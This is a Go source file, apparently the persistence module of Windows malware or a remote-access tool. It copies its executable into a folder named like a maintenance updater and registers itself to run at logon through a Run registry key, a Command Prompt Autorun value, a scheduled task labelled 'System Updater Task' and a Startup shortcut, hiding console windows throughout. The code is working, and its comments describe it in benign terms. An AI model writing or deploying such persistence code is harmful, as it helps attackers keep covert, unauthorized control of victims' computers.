package sysutils

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"syscall"
	"time"

	"golang.org/x/sys/windows/registry"
)

// LogErrorToFile writes error messages to a text file located in the same directory as the executable.
// This helps in tracking and debugging issues that may occur during runtime.
func LogErrorToFile(logMessage string) {
	logFilePath, err := getLogFilePath()
	if err != nil {
		fmt.Printf("Failed to get log file path: %v\n", err)
		return
	}

	logFile, err := os.OpenFile(logFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("Failed to open log file: %v\n", err)
		return
	}
	defer logFile.Close()

	logMessage = fmt.Sprintf("%s: %s\n", time.Now().Format("2006-01-02 15:04:05"), logMessage)
	if _, err := logFile.WriteString(logMessage); err != nil {
		fmt.Printf("Failed to write to log file: %v\n", err)
	}
}

func getLogFilePath() (string, error) {
	executablePath, err := os.Executable()
	if err != nil {
		return "", fmt.Errorf("failed to get executable path: %w", err)
	}
	return filepath.Join(filepath.Dir(executablePath), "error_log.txt"), nil
}

// RunCommandInBackground runs a command in the background without showing a command prompt window.
func RunCommandInBackground(command string, args ...string) error {
	cmd := exec.Command(command, args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Run()
}

// MoveToSysDir relocates the executable to a system directory under AppData\Roaming for organized management.
// This will only occur if persistence is not set to "0".
func MoveToSysDir(executablePath string, persistenceOption string) (string, error) {
	if persistenceOption == "0" {
		return executablePath, nil
	}

	sysDir := filepath.Join(os.Getenv("APPDATA"), "MaintenanceTask", "UpdaterService")
	err := os.MkdirAll(sysDir, os.ModePerm)
	if err != nil {
		LogErrorToFile(fmt.Sprintf("Failed to create directory %s: %v", sysDir, err))
		return "", fmt.Errorf("failed to create directory %s: %w", sysDir, err)
	}

	destPath := filepath.Join(sysDir, filepath.Base(executablePath))
	if _, err := os.Stat(destPath); err == nil {
		return destPath, nil
	}

	if err := copyFile(executablePath, destPath); err != nil {
		return "", err
	}

	return destPath, nil
}

func copyFile(sourcePath, destPath string) error {
	sourceFile, err := os.Open(sourcePath)
	if err != nil {
		LogErrorToFile(fmt.Sprintf("Failed to open source file %s: %v", sourcePath, err))
		return fmt.Errorf("failed to open source file %s: %w", sourcePath, err)
	}
	defer sourceFile.Close()

	destFile, err := os.Create(destPath)
	if err != nil {
		LogErrorToFile(fmt.Sprintf("Failed to create destination file %s: %v", destPath, err))
		return fmt.Errorf("failed to create destination file %s: %w", destPath, err)
	}
	defer destFile.Close()

	if _, err = io.Copy(destFile, sourceFile); err != nil {
		LogErrorToFile(fmt.Sprintf("Failed to copy file to %s: %v", destPath, err))
		return fmt.Errorf("failed to copy file to %s: %w", destPath, err)
	}

	return nil
}

// SetupAutoStartRegistry creates a registry entry to ensure the application starts automatically when the user logs in.
func SetupAutoStartRegistry(valueName, executablePath, persistenceOption string) error {
	if persistenceOption == "0" {
		return nil
	}
	return createRegistryEntry(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, valueName, executablePath)
}

func createRegistryEntry(keyRoot registry.Key, path, valueName, value string) error {
	key, err := registry.OpenKey(keyRoot, path, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		LogErrorToFile(fmt.Sprintf("Failed to open registry key: %v", err))
		return fmt.Errorf("failed to open registry key: %w", err)
	}
	defer key.Close()

	existingValue, _, err := key.GetStringValue(valueName)
	if err == nil && existingValue == value {
		return nil
	}

	err = key.SetStringValue(valueName, value)
	if err != nil {
		LogErrorToFile(fmt.Sprintf("Failed to set registry key value: %v", err))
		return fmt.Errorf("failed to set registry key value: %w", err)
	}

	return nil
}

// ConfigureCmdAutoRun sets up a command to run automatically when Command Prompt is opened.
func ConfigureCmdAutoRun(valueName, command, persistenceOption string) error {
	if persistenceOption == "0" {
		return nil
	}
	return createRegistryEntry(registry.CURRENT_USER, `Software\Microsoft\Command Processor`, "Autorun", command)
}

// SetupScheduledTask schedules a task in Windows Task Scheduler to ensure the application runs at user login.
func SetupScheduledTask(taskName, executablePath, persistenceOption string) error {
	if persistenceOption == "0" {
		return nil
	}

	checkTaskCmd := fmt.Sprintf(`SchTasks /Query /TN "%s"`, taskName)
	cmdCheck := exec.Command("cmd", "/C", checkTaskCmd)
	cmdCheck.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err := cmdCheck.Run(); err == nil {
		return nil
	}

	powershellCommand := fmt.Sprintf(`$action = New-ScheduledTaskAction -Execute "%s"; `+
		`$trigger = New-ScheduledTaskTrigger -AtLogOn; `+
		`$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable; `+
		`Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "%s" -Description "System Updater Task" -User $env:USERNAME`,
		executablePath, taskName)

	return RunCommandInBackground("powershell", "-Command", powershellCommand)
}

// CreateStartupShortcut creates a shortcut to the application in the user's Startup folder for automatic launch at login.
func CreateStartupShortcut(executablePath, persistenceOption string) error {
	if persistenceOption == "0" {
		return nil
	}

	usr, err := user.Current()
	if err != nil {
		LogErrorToFile(fmt.Sprintf("Failed to get current user: %v", err))
		return fmt.Errorf("failed to get current user: %w", err)
	}

	startupPath := filepath.Join(usr.HomeDir, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup", filepath.Base(executablePath)+".lnk")
	if _, err := os.Stat(startupPath); err == nil {
		return nil
	}

	return RunCommandInBackground("powershell", "-Command", fmt.Sprintf(`$wshell = New-Object -ComObject WScript.Shell; $shortcut = $wshell.CreateShortcut('%s'); $shortcut.TargetPath = '%s'; $shortcut.Save()`, startupPath, executablePath))
}
